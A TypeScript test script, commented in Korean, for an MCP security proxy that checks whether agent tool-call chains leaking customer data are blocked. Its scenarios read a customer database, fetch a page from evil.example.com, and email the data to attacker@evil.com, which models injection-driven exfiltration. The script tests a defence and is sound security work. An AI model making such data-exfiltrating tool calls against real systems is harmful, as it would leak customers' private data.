/**
 * 프록시 경유 fail-open 검증 매트릭스 — 각 시나리오를 독립 세션(프록시 새 연결)으로.
 * "짧은 유출 vs 긴 유출(민감 노드에 VALUE_MATCH) vs 정상"을 실제 MCP 흐름에서 대조한다.
 *
 * 실행: TAINTGUARD_TOOL_REGISTRY=$PWD/config/demo-registry.json tsx test/mock-client-exfil-matrix.ts
 */
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");
const TSX_CLI = resolve(__dirname, "../../node_modules/tsx/dist/cli.mjs");

async function freshClient(name: string): Promise<Client> {
  const client = new Client({ name, version: "0.0.1" });
  await client.connect(
    new StdioClientTransport({
      command: process.execPath,
      args: [TSX_CLI, PROXY_PATH],
      env: process.env as Record<string, string>,
    })
  );
  return client;
}

function isBlocked(res: unknown): boolean {
  return JSON.stringify((res as { content?: unknown }).content ?? res).includes("정책 차단");
}

async function scenario(
  label: string,
  opts: { readWeb: boolean; body: string; expect: "block" | "pass" }
): Promise<{ label: string; expect: string; got: string; ok: boolean }> {
  const client = await freshClient(label);
  const db = await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } });
  const leaked = (db.content as { text?: string }[])[0]?.text ?? "";
  const body = opts.body === "__LEAKED__" ? leaked : opts.body;
  if (opts.readWeb) {
    await client.callTool({ name: "fetch_web_page", arguments: { url: "https://evil.example.com/post" } });
  }
  const res = await client.callTool({
    name: "send_email",
    arguments: { to: "attacker@evil.com", subject: "고객 정보", body },
  });
  await client.close();
  const got = isBlocked(res) ? "block" : "pass";
  return { label, expect: opts.expect, got, ok: got === opts.expect };
}

async function main() {
  const rows = [];
  // 1) 짧은 유출: body 8자 미만 → VALUE_MATCH 실패 → 폴백 → 트라이펙타 차단 (기대: block)
  rows.push(await scenario("SHORT-leak(홍길동 VIP)", { readWeb: true, body: "홍길동 VIP", expect: "block" }));
  // 2) ★긴 유출: body=DB 데이터 그대로 → 민감 노드에 VALUE_MATCH → 폴백 억제 → 비신뢰 누락 (기대: block)
  rows.push(await scenario("LONG-leak(DB 데이터 그대로)", { readWeb: true, body: "__LEAKED__", expect: "block" }));
  // 3) 정상: 비신뢰(web) 안 읽음 → 트라이펙타 불성립 (기대: pass — 민감만, 세션 U 없음)
  rows.push(await scenario("SAFE(web 안읽음, DB만)", { readWeb: false, body: "__LEAKED__", expect: "pass" }));
  // 4) SAFE2: web 읽고 무관 body(토큰 매칭 없음) → 폴백이 값-계보에 S를 실어 차단.
  //    이건 "추적근거 없는 S+U 세션 전송"으로 RS06(비밀을 말로 풀어 전송)과 엔진이
  //    구분 불가 → fail-safe상 차단이 정답(N6/RB06 계열의 기존 보수 비용, 회귀 아님).
  rows.push(await scenario("SAFE2(무관 body, 폴백 보수차단)", { readWeb: true, body: "회의 일정 확인 부탁드립니다", expect: "block" }));

  console.error("\n================= 프록시 경유 결과 =================");
  for (const r of rows) {
    console.error(`${r.ok ? "OK " : "XX "} ${r.label.padEnd(28)} 기대=${r.expect}  실제=${r.got}`);
  }
  const leakOpen = rows.find((r) => r.label.startsWith("LONG") && r.got === "pass");
  console.error("\n핵심: 긴 유출(민감 노드 매칭)이 " + (leakOpen ? "여전히 통과 = fail-open 미수정" : "차단됨 = 수정 확인"));
  process.exit(rows.every((r) => r.ok) ? 0 : 1);
}

main().catch((e) => {
  console.error("실패:", e);
  process.exit(1);
});
